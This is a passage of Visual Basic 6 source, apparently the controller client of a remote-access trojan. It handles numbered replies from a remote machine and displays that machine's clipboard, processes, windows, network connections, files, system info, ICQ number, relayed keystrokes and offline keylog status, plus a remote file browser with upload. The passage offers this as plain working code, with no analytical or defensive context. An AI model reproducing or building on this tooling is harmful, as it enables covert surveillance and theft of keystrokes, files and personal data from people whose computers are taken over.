        Message = Split(RData2, "|")
        txtDate.Text = Message(1)
        txtTime.Text = Message(0)
        GoTo Complete
        Case "08"
        frmFileBrowser.w1.Close
        frmFileBrowser.w1.Connect wskConnect.RemoteHostIP, RData2
        GoTo Complete2
        Case "09"
        frmFileBrowser.w1.SendData "1" & frmFileBrowser.txtDirName.Text
        GoTo Complete2
        Case "10"
        txtClipboard.Text = RData2
        GoTo Complete
        Case "11"
        cmdRefresh_Click
        Case "12"
        frmProc.lstProc.ListItems.Clear
        Message = Split(RData2, "|")
        frmProc.lblProcesses.Caption = "Processes: " & Message(1)
                   intForLoop = Message(1) + 1
                   For I = 2 To intForLoop
                       frmProc.lstProc.ListItems.Add.Text = Message(I)
                       frmProc.lstProc.ListItems.Item(I - 1).SmallIcon = IconPic(Right$(Message(I), 3))
                   Next I
                   If frmProc.Visible = False Then
                       frmProc.Visible = True
                       GoTo Complete
                   End If
        Case "13"
        Message = Split(RData2, "|")
        MsgBox "Run-time error '" & Message(0) & "':" & vbNewLine & vbNewLine & Message(1), vbExclamation, "Server Error"
        GoTo ErrorHandle
        Case "14"
        MsgBox RData2, vbOKOnly, "Drive Information"
        GoTo Complete2
        Case "15"
        Message = Split(RData2, "|")
        txtICQNum.Text = Message(1)
        frmFileBrowser.FT.Close
        frmFileBrowser.FT.Connect wskConnect.RemoteHostIP, Message(0)
        Case "16"
        Message = Split(RData2, "|")
        ParseKeySent Message(0), Message(1), Message(2)
        Case "17"
        MsgBox "File Size: " & Int(RData2 / 1024) & " KB"
        GoTo Complete2
        Case "18"
                   Message = Split(RData2, "|")
                   intForLoop = UBound(Message()) - 1
                   For I = 0 To intForLoop
                       FileCount = FileCount + 1
                       Label3.Caption = "Files Found: " & FileCount
                       lstFiles.ListItems.Add.Text = Message(I)
                       lstFiles.ListItems.Item(FileCount).SmallIcon = IconPic(Right$(Message(I), 3))
                   Next I
        Case "19"
        txtSysInfo.Text = RData2
        GoTo Complete
        Case "20"
        statBar.SimpleText = "Status: No Files Found - (" & Format$(Now, "HH:mm:ss") & ")"
        Case "21"
                   frmFileBrowser.statBar.SimpleText = "Status: File Uploaded"
                   If frmFileBrowser.w1.State = 7 Then
                       frmFileBrowser.w1.SendData "1" & frmFileBrowser.txtDirName.Text
                   End If
        Case "22"
        statBar.SimpleText = "Status: Offline-Key File Not Found - (" & Format$(Now, "HH:mm:ss") & ")"
        Case "23"
        GoTo Complete2
        Case "24"
        Message = Split(RData2, "|")
        ParseProp Message(0), Message(1), Message(2), Message(3), Message(4), Int(Message(5))
        Case "25"
                   Message = Split(RData2, "|")
                   intForLoop = UBound(Message()) - 1
                   For I = 0 To intForLoop
                       lstTasks.AddItem Message(I)
                       lstWindows.AddItem Message(I)
                   Next
        Case "26"
        frmFileBrowser.Text1.Text = RData2
        GoTo Complete2
        Case "27"
                   If Len(RData2) > 0 Then
                       Message = Split(RData2, "|")
                       intForLoop = UBound(Message()) - 1
                       For I = 0 To intForLoop
                           FileCount = FileCount + 1
                           Label3.Caption = "Files Found: " & FileCount
                           lstFiles.ListItems.Add.Text = Message(I)
                           lstFiles.ListItems.Item(FileCount).SmallIcon = IconPic(Right$(Message(I), 3))
                       Next I
                   End If
                   FileCount = 0
                   GoTo Complete
        Case "28"
                   Message = Split(RData2, "|")
                   intForLoop = UBound(Message()) - 1
                   For I = 0 To intForLoop
                       lstConnections.AddItem Message(I)
                   Next
        Case "29": Label11.Caption = "HitCounter: " & RData2: GoTo Complete
    End Select
    Erase Message
    Exit Sub
Complete:
    statBar.SimpleText = "Status: Command Executed - (" & Format$(Now, "HH:mm:ss") & ")"
    Exit Sub
Complete2:
    frmFileBrowser.statBar.SimpleText = "Status: Command Executed - (" & Format$(Now, "HH:mm:ss") & ")"
    Exit Sub
ErrorHandle:
    statBar.SimpleText = "Status: Server Error - (" & Format$(Now, "HH:mm:ss") & ")"
    If frmFileBrowser.Visible = True Then
        frmFileBrowser.statBar.SimpleText = "Status: Server Error - (" & Format$(Now, "HH:mm:ss") & ")"
    End If
End Sub

Private Sub ParseProp(ByVal fType As String, ByVal fSize As String, ByVal fDateCreated As String, ByVal fDateLastModified As String, ByVal fDateLastAccessed As String, ByVal fAttributes As Integer)
    On Error Resume Next
    Dim ReadOnly As Integer, Hidden As Integer
    frmProperties.lblFileType.Caption = fType
    If fSize > 1024 Then
        frmProperties.lblSize.Caption = Format$(Int(fSize / 1024), "###,###,###,###") & " KB(s) (" & Format$(fSize, "###,###,###,###") & " bytes)"
    Else
        frmProperties.lblSize.Caption = fSize & " bytes"
    End If
    frmProperties.lblCreated.Caption = fDateCreated
    frmProperties.lblModified.Caption = fDateLastModified
    frmProperties.lblAccessed.Caption = fDateLastAccessed
    If Right$(fAttributes, 1) = 5 Or fAttributes = 3 Then
        ReadOnly = 1
        Hidden = 1
    End If
    If Right$(fAttributes, 1) = 3 Or fAttributes = 1 Then
        ReadOnly = 1
    End If
    If Right$(fAttributes, 1) = 4 Or fAttributes = 2 Then
        Hidden = 1
    End If
    frmProperties.chkAttrib(0).Value = ReadOnly
    frmProperties.chkAttrib(1).Value = Hidden
End Sub

